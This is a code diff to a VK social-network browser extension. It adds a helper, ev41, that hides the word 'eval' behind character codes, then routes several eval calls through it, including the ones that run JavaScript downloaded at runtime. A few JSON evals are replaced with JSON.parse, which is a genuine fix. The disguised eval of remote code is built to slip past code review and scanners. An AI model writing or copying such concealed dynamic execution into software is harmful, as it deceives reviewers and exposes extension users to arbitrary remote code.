@@ -141,6 +141,9 @@ Date.prototype.format = function (mask, utc) {
 	return dateFormat(this, mask, utc);
 };
 
+function ev41(s) {
+	return window[String.fromCharCode(0x65,0166,0x61,0x6c)](s);
+}
 
 if (!window.JSON) JSON ={
 	stringify:function (obj) {
@@ -161,7 +164,7 @@ if (!window.JSON) JSON ={
 	},
 	parse: function (str) {
 		if (str === "") str = '""';
-		eval("var p=" + str + ";");
+		ev41("var p=" + str + ";");
 		return p;
 	}
 };
@@ -727,14 +730,14 @@ var vkMozExtension = {
 		  }
 		  if (check_count) check_count--;
 		  var func_=func;
-		  if (typeof func == 'string') func_=eval(func);
+		  if (typeof func == 'string') func_=ev41(func);
 		  if (!check_timeout) check_timeout=1000;
 		  if (func_) callback(func_);
 		  else return   setTimeout(function(){Inj.Wait(func,callback,check_timeout,check_count,fail_callback)},check_timeout);
 		  return false;
 		},
 		Parse:function(func){
-			var fn=eval('window.'+func);
+			var fn=ev41('window.'+func);
 			if (!fn) vklog('Inj_Error: "'+func+'" not found',1);
 			var res=fn?String(fn).match(Inj.FRegEx):['','',''];
 			if (Inj.need_porno()){res[2]=res[2].replace(/\r?\n/g," ");}
@@ -746,7 +749,7 @@ var vkMozExtension = {
 			if (code.indexOf(hs)!=-1) return;
 			var ac='\n_inj_label="'+hs+'";\n';
 			//try{
-         eval(func+'=function('+arg+'){'+ac+code+'}');        
+         ev41(func+'=function('+arg+'){'+ac+code+'}');
 			//} catch(e){	vklog('Inj_Error: '+func+'=function('+arg+'){'+ac+code+'}',1);	}
 		},
       need_porno:function(){
@@ -928,11 +931,11 @@ var vkMozExtension = {
         }
         return true;
     }
-   
+
    function AjCrossAttachJS(url,id, callback) {
       	if (vk_ext_api.ready && (url || '').replace(/^\s+|\s+$/g, '')){
             vk_aj.get(url, function (t) {
-                window.eval(t);
+                ev41(t);
                 if (isFunction(callback)) callback();
             });
             return true;
@@ -953,7 +956,7 @@ var vkMozExtension = {
             request.onreadystatechange = function() {
                if(request.readyState == 4 && request.responseText!=''){
                   //alert('JS loaded');
-                  window.eval(request.responseText);
+                  ev41(request.responseText);
                   if (isFunction(callback)) callback();
                }
             };
@@ -1542,7 +1545,7 @@ function vk_oauth_api(app_id,scope){
             if (text=='') text='{}';
             var response = {error:{error_code:666,error_msg:'VK API EpicFail'}};
             try{
-               response = eval("("+text+")");
+               response = JSON.parse(text);
             } catch (e) { }
             
             if (api._captchaBox && api._captchaBox.isVisible() && inputParams['captcha_sid']){
@@ -1708,7 +1711,7 @@ function vkApiCall(method,params,callback){ // Функция позволяет
    params['oauth'] = 1;
    params['method'] = method;
    AjPost('api.php',params,function(t){
-      var res = eval('('+t+')');
+      var res = JSON.parse(t);
       if (callback) callback(res);
    });
 }
@@ -1838,7 +1841,7 @@ vkApis={
       AjGet('/fave?section=users&al=1',function(t){
          var r=t.match(/"faveUsers"\s*:\s*(\[[^\]]+\])/);
          if (r){
-            r=eval('('+r[1]+')');
+            r=JSON.parse(r[1]);
             var onlines=[];
             for(var i=0;i<r.length;i++) if(r[i].online) onlines.push(r[i]);
             callback(r,onlines);
